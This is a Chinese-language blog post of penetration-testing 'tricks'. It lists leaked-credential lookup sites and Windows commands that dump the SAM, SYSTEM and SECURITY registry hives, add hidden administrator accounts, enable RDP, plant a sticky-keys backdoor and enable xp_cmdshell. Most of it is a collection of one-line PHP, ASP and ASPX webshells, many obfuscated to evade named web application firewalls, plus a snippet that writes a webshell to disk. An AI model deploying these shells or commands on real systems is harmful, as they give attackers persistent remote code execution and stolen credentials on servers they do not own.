---
title: 那些Hack神器及奇技淫巧
date: 2016-09-11 23:07:28
tags: Hack
categories: Hack

---
# 简介
这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。

# 那些网站
## 社工库

### 国内

http://www.findmima.com/

http://www.wghostk.com/so/

http://p.08lt.com

http://www.144118.com/

### 国际

https://haveibeenpwned.com/

https://leakbase.pw/

## C段
http://www.144118.com/

## whois查询
http://whois.domaintools.com/

## 历史页面

# 那些实用命令
## reg导出sam
reg save hklm\sam sam.hive

reg save hklm\system system.hive

reg save hklm\security security.hive

## Windows新建用户
net user admin$ admin /add

net localgroup administrators admin$ /add

net user Guest 1234

net user Guest /active:yes

net localgroup administrators Guest /add

## 打开3389(2003,xp)
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

## sethc后门
Copy C:\windows\explorer.exe C:\Windows\System32\sethc.exe /y

## mssql xpcmdshell报错
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

# 那些一句话

## asp一句话木马
```
<%eval request("x")%>
```

## php一句话木马
```
<?php eval($_POST[g]);?>
```

## aspx一句话
```
<%@ Page Language="Jscript"%><%eval(Request.Item["x"],"unsafe");%>
```

## 数据库加密一句话(密码a)
```
┼攠數畣整爠煥敵瑳∨≡┩愾
```

## 网站配置、版权信息专用一句话
```
"%><%Eval Request(x)%>
```

## 一句话再过护卫神
```
<%Y=request("x")%> <%execute(Y)%>
```

## 过拦截一句话木马
```
<% eXEcGlOBaL ReQuEsT("x") %>
```

## asp闭合型一句话 
```
%><%eval request("0o1Znz1ow")%><%
```

## 能过安全狗的解析格式
```
;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg
```

## 突破安全狗的一句话
```
<%Y=request("x")%> <%eval(Y)%>
```

## elong过安全狗的php一句话
```
<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST[cc]);  ?>
```

## 后台常用写入php一句话（密码x）
```
<? 
 $fp = @fopen("c.php", 'a'); 
 @fwrite($fp, '<'.'?php'."\r\n\r\n".'eval($_POST[x])'."\r\n\r\n?".">\r\n"); 
 @fclose($fp); 
 ?>
```
 
## 高强度php一句话
```
<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>
```

## 新型变异PHP一句话(密码b4dboy)
```
($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);
```

## 突破安全狗的aspx一句话
```
<%@ Page Language="C#" ValidateRequest="false" %>
<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["你的密码"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
```

## 突破护卫神，保护盾一句话
```
<?php $a = str_replace(x,"","axsxxsxexrxxt");
$a($_POST["test"]); ?>
```

## PHP高强度一句话：
```
<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  
```

菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c
```
<?php assert($_REQUEST["c"]);?>
```

## aspx过狗
```
<%@ Page Language="Jscript"%><%var name:String=Request.Item["cmd"];Response.Write(eval(name,"unsafe"));%>
```

# 那些神器
* Sqlmap

